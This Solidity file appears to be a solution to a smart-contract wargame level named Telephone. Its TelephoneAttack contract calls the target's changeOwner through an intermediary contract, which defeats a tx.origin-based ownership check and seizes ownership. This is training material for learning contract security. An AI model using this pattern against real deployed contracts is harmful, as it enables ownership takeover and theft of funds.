// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lessons/04-Telephone.sol";

contract TelephoneAttack {
    Telephone telephone;

    constructor(address telephoneAddress) public {
        telephone = Telephone(telephoneAddress);
    }

    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
